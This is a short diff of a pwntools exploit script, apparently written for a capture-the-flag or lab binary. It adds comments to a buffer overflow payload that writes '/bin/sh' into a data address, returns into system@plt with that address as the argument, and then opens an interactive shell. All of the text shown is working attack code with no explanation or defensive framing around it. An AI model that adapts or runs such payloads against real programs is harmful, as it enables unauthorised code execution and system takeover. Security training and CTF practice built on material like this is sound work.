@@ -53,10 +53,11 @@ gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
 r.recvuntil('> ')
 payload = ""
 payload += "A"*44
-payload += writeBytes(0x804a028, 0x6e69622f)
-payload += writeBytes(0x804a02c, 0x0068732f)
-payload += p32(0x8048430)       # system@plt
+payload += writeBytes(0x804a028, 0x6e69622f)    # /bin
+payload += writeBytes(0x804a02c, 0x0068732f)    # /sh
+payload += p32(0x8048430)                       # system@plt
 payload += "BBBB"
-payload += p32(0x804a028)
+payload += p32(0x804a028)                       # data addr
+
 r.sendline(payload)
 r.interactive()
